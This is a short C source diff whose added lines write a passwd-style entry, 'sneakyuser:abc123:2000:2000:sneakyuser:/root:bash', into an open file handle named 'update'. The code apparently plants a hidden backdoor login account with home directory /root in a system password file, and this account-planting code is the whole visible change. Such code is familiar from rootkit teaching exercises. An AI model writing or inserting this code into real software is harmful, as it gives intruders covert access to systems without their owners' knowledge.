@@ -44,5 +44,17 @@ int main(int argc, char **argv) {
     exit(EXIT_FAILURE);
   }
 
+  char newline[] = "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n";
+  int pos = 0;
+  while (newline[pos] != '\0') {
+    fputc(newline[pos], update);
+    pos++;
+  }
+
+  fclose(update);
+
+  if (DEBUG)
+    printf("Update file successfully...\n");
+
   return 0;
 }
